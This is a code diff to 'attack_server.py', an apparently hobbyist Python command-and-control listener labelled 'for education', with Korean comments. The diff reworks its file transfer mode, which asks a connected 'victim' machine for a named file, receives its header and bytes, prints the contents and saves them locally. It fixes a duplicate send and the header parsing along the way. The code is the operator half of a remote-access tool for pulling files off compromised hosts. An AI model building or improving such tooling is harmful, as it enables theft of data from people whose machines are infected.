@@ -1,7 +1,9 @@
 #attack_server.py
 import socket
-import os,time
+import os,time, subprocess
 import ascii_quokka as ascii_quokka
+import sys
+
 
 VERSION="develop 1.0 , for education by jeho"
 
@@ -9,14 +11,17 @@ HOST = '0.0.0.0' # i don't know my ip, router!
 PORT = 9001 #free port of host
 CUSTUM_PORT = False # user enter to set port
 
-my_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
 print(VERSION)
 
+current_directory_path = os.path.dirname(os.path.abspath(__file__))
+print(f"script executing path : {current_directory_path}")
+
+###debug script area
+
+###
 os.system('pause') #ascii 가 깨지지 않도록 interrupt
 
 ascii_quokka.print_ascii(VERSION)
-
 
 def bind_listen(sock,host,port):
     try:
@@ -58,17 +63,17 @@ def file_transfer_mode(conn_param):
         return 0
     else: # 파일 이름 입력 시.
         print("filename entered...")
-        send_and_recv(conn_param,filename_input) # file_name send and wait
-        recved = send_and_recv(conn_param,filename_input)
+        recved = send_and_recv(conn_param,filename_input) # file_name send and wait
 
         if(recved[:5]=="error"): #victim 으로부터 file이 없다 등의 error 를 받으면 ft mode 종료
             print(f"recved : {recved}") #error 전문 출력
             return 0
         elif(recved[:8]=="fileinfo"):
             # file이 존재하면, victim 은 file info 를 보낸다. 
-            print(f"recevd : {recved}")
+            print("fileinfo recved!!!")
+            print(f"fileinfo : {recved}")
 
-            file_name, file_size = recved.split() #file_info recv
+            fileinfostr, file_name, file_size = recved.split() #file_info recv
 
             file_size=int(file_size)
 
@@ -83,17 +88,18 @@ def file_transfer_mode(conn_param):
                     break
                 file_content+=data_segment
 
+            print("downloaded binary >>")
             print(file_content.decode()) #받은 파일 보기
+            print(">>>>>>>>>>>>>>>>>>>>>")
 
-            # 파일 저장 (주의, permission 때문에 __file__의 dir을 제외한 다른 폴더에는 쓰기 작업할 수 없음)
-            saved_file_path = os.path.join(os.getcwd(),{file_name})
-            print(f"saved_file_path = {saved_file_path}")
+            # 파일 저장 
             try:
-                with open(saved_file_path,'wb') as f:
+                file_name_saved = f"{file_name}"
+                file_download_path = os.path.join(current_directory_path,file_name_saved)
+                with open(file_download_path,'wb') as f:
                     f.write(file_content)
-                    print("recved file saved at host...")
-                    print(f"path : {saved_file_path}")
-                    return 0 # 파일쓰기를 완료하면 ft_mode 종료
+                print(f"file saved success!! at : {file_download_path}")
+                return 0 # 파일쓰기를 완료하면 ft_mode 종료
             except Exception as e:
                 print(e)
                 return 0 # 파일쓰기 오류가 발생하면 오류를 출력한 후 ft_mode 종료
@@ -111,6 +117,7 @@ while(True):
         break
     else:
         break
+my_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 bind_listen(my_sock,HOST,PORT)
 
